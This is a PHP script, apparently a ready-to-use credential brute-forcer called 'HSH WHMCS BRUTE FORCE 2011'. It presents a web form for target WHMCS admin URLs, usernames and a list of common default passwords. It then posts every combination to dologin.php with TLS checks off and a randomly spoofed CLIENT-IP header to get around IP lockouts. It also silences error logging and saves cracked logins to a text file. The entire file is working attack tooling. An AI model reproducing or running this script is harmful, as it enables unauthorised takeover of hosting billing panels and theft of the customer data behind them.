<?php
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', '2.2');
echo "<style type=\"text/css\"></style><style type=\"text/css\"></style></head><center><font size=\"7\" color=\"#0078AA\">HSH WHMCS BRUTE FORCE 2011 </font></center><center>  <form method=\"post\"> <center> \n"; 
echo "<textarea rows='15' cols='45' name=\"site\">http://target.com/admin/</textarea>\n"; 
echo "<textarea rows='15' cols='30' name=\"user\">admin \n"; 
echo "demo\n"; 
echo "admin123\n"; 
echo "</textarea><textarea rows='15' cols='30' name=\"pass\">\n"; 
echo "admin\n"; 
echo "123456\n"; 
echo "password\n"; 
echo "102030\n"; 
echo "123123\n"; 
echo "12345\n"; 
echo "123456789\n"; 
echo "pass\n"; 
echo "test\n"; 
echo "admin123\n"; 
echo "demo\n"; 
echo "!@#$%^\n"; 
echo "</textarea><br><input type=\"submit\" name='start' value=\" [ P L A Y ] \" /></form></center>\n";
 set_time_limit(0); 
    error_reporting(0); 
    @apache_setenv('no-gzip', 1); 
    @ini_set('zlib.output_compression', 0); 
    @ini_set('implicit_flush', 1); 
    for($i=0;$i<= ob_get_level(); $i++) 
    { 
        ob_end_flush(); 
    } 
    ob_implicit_flush(1); 
 function check_ip($ip) { 
    if ((!empty($ip) && ip2long($ip) != 0 - 1) && ip2long($ip) != false) { 
        $private_ips = array(array("0.0.0.0", "2.255.255.255"), array("10.0.0.0", "10.255.255.255"), array("127.0.0.0", "127.255.255.255"), array("169.254.0.0", "169.254.255.255"), array("172.16.0.0", "172.31.255.255"), array("192.0.2.0", "192.0.2.255"), array("192.168.0.0", "192.168.255.255"), array("255.255.255.0", "255.255.255.255")); 
        foreach ($private_ips as $r) { 
            $min = ip2long($r[0]); 
            $max = ip2long($r[1]); 

            if ($min <= ip2long($ip) && ip2long($ip) <= $max) { 
                return false; 
                continue; 
            } 
        } 

        return true; 
    } 

    return false; 
} 
function login($url,$user,$pass){ 
    global $ip; 

    $post = array('username'=>$user,'password'=>$pass,'rememberme'=>'on'); 

    $ch = curl_init(); 
    curl_setopt($ch,CURLOPT_URL,"$url/dologin.php"); 
    curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false); 
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false); 
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); 
    curl_setopt($ch,CURLOPT_HTTPHEADER,array("CLIENT-IP: $ip")); 
    curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; rv:17.0) Gecko/20100101 Firefox/17.0'); 
    curl_setopt($ch,CURLOPT_POST,true); 
    curl_setopt($ch,CURLOPT_POSTFIELDS,$post); 
    curl_setopt($ch,CURLOPT_HEADER,true); 
    curl_setopt($ch,CURLOPT_REFERER,"$url/login.php"); 
    $return = curl_exec($ch); 
    curl_close($ch); 
    //echo $return; 
    if(preg_match('/Location\: index\.php/',$return)){ 
        return true; 
    }else{ 
        return false; 
    } 
} 
if($_POST['start']){ 
$fp=fopen("HsH-whmcs.txt","a+"); 


 foreach(explode("\n",$_POST['site']) as $site){ 
   $site=trim($site); 
foreach(explode("\n",$_POST['user']) as $user){ 
    $user = trim($user); 
    foreach(explode("\n",$_POST['pass']) as $pass){ 
        $pass = trim($pass); 
        echo "<font color='lime'><br>Scann $site | $user | $pass<br></font> "; 

        while (true) { 
            $ip = long2ip(rand(11111,99999999999)); 
            if(!@in_array($ip,$ips)&&check_ip($ip)){ 
                $ips[] = $ip; 
                break; 
            } 
        } 

        if(login($site,$user,$pass)){ 
            echo "<center><font size='5' color='aqua'><br>[+] $site <br> [+]user : $user.<br> password:$pass\n<br></font></center>"; 

            fwrite($fp,"Target : $site\r\nUsername : $user\r\nPassword : $pass\r\n===================================\r\n"); 
            break; 
        }else{ 
            echo "Ora Kenek COK \n"; 
        } 
    } 
} 
} 


    } 


}
?>
